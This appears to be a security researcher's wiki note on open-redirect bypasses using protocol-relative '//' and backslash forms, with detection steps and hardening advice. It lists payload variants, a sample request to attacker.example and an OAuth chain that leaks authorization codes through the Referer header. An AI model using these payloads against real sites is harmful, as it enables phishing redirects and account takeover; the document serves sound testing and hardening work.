---
title: Open redirect via protocol-relative double-slash
slug: open-redirect-double-slash
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/csrf, technique/open-redirect, technique/oauth, technique/ssrf]
inbound: []
---

# Open redirect via protocol-relative double-slash

## Pattern
A common, lazy "is this URL relative?" filter just checks if the value
starts with `/`. The `//host.example/path` form *also* starts with `/` —
but browsers treat it as **protocol-relative absolute** (inheriting the
current page's scheme). Result: a string-prefix check that intended to
allow only same-origin relative redirects actually allows arbitrary
external redirects.

Variants that bypass the same naive checks:

- `\\attacker.example` (backslash → slash normalization differences
  between server and browser).
- `/\attacker.example` (slash-then-backslash).
- `/ %0d%0a%2F%2Fattacker.example` and whitespace prepends.
- Tab/whitespace/control characters between the leading `/` and `//`.

## Preconditions
- App accepts a redirect target via parameter (e.g. `?next=/foo`).
- Server-side validation is a string-prefix or `startswith('/')` check
  rather than a parsed-URL hostname comparison.

## Detection
- Send each variant against `?next=`, `?url=`, `?return=`, `?continue=`,
  `?redirect=`, etc. Observe the final `Location:` header.
- Watch for downstream SSRF flows that follow redirects — open redirect
  here turns "same-host" SSRF gates into arbitrary-host SSRFs.

## Triggering
```
GET /login?next=//attacker.example/ HTTP/1.1
```
On HTTPS pages this becomes `https://attacker.example/`.

OAuth chain (steal auth code via Referer):
```
?redirect_uri=https://legit.com/cb?next=//attacker.example
```
The legit callback bounces to attacker, which gets `Referer: https://legit.com/cb?code=...`.

## Bypasses / hardening
- Parse the URL with a standards-compliant parser, then compare
  `parsed.host` to a whitelist — never substring/prefix.
- Strip leading whitespace and normalize `\` → `/` before validation if
  validating textually.

## Seen in the wild
- {date: 2023-11-30, source: CT Ep 47} — Johan Carlson tip; JG confirms
  this is also OAuth-101 and SAML-redirect-URI gadget.
- Universal SSRF-101 starter.

## References
- Critical Thinking Podcast Ep 47
- Related: [[redirect-uri-bypass]], [[taint-flow-open-redirect]]
